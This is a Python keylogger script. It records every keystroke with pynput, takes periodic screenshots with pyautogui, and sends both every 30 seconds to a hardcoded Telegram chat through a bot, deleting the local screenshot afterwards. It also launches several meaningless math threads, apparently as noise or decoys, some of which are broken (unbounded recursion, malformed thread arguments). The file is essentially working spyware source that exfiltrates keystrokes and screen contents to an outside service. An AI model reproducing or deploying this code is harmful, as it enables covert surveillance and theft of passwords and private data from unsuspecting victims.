#!/usr/bin/python
import threading
import pynput.keyboard
import telegram
import asyncio
import pyautogui
import time
import math
import os

def do_math(number):
	for i in range(0,100):
		result = math.factorial(math.sqrt(3) * (2 + math.log(number)) - 2 * do_math(i))
	print(result)

thread = threading.Thread(target=do_math, args=400000)
thread.start()	

def calculate_square_root(number):
    result = math.sqrt(number)
    print(f"Square root of {number} is {result}")

square_root_thread = threading.Thread(target=calculate_square_root, args=(999999999999,))
square_root_thread.start()

def do_log(number):
	for i in range(0,100000):
		j = math.log10(i) * math.sqrt(i) + i + number * calculate_factorial(number)
	return j

log_thread = threading.Thread(target=do_log,args=2000)
log_thread.start()

class Keylogger:

	def __init__(self, time_interval,token):
		self.logger = "[Keylogger Initiated]"
		self.subject = "Keylogger Report Email"
		self.interval = time_interval
		self.token = token
		self.image = ""
		self.get_image()
	
	def get_image(self):
		path = 'screenshot1.png'
		pyautogui.screenshot(r'screenshot1.png')
		self.image = path

	def append_to_log(self, key_strike):
		self.logger = self.logger + key_strike

	def evaluate_keys(self, key):
		try: 
			Pressed_key = str(key.char)
		except AttributeError:
			if key == key.space or key == key.backspace or key == key.tab or key == key.enter or key == key.alt_l :
				Pressed_key =  " "
			else:
				Pressed_key =  " " + str(key) + " "
		
		self.append_to_log(Pressed_key)


	async def report(self):
		while True:
			await asyncio.sleep(self.interval)
			if self.logger:
				self.get_image()
				try:
					await self.send_bot(self.logger)
					await self.send_image(self.image)
					try:
						os.remove("screenshot1.png")
					except FileExistsError or PermissionError:
						pass	
					self.logger = ""
					self.image = ""
				except telegram.error.BadRequest:
					self.logger = ""
					self.image = ""	
	
	async def send_image(self,path):
		bot = telegram.Bot(token=self.token)
		async with bot:
			try:
				await bot.send_photo(chat_id=-4117162001,photo = open(path, 'rb'))
				print("sent ", path)
			except FileNotFoundError or telegram.error.BadRequest:
				pass

	async def send_bot(self,message):	
		bot = telegram.Bot(token=self.token)
		async with bot:
			await bot.send_message(chat_id=-4117162001,text=message)
			print("sent ",message)			

	async def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
		with keyboard_listener:
			await self.report()
			keyboard_listener.join()


def calculate_factorial(number):
		result = math.factorial(number)
		print(f"factorial is ")	

calculation_thread = threading.Thread(target=calculate_factorial, args=(10000,))
calculation_thread.start()		


my_keylogger = Keylogger(30,"your token")
asyncio.run(my_keylogger.start())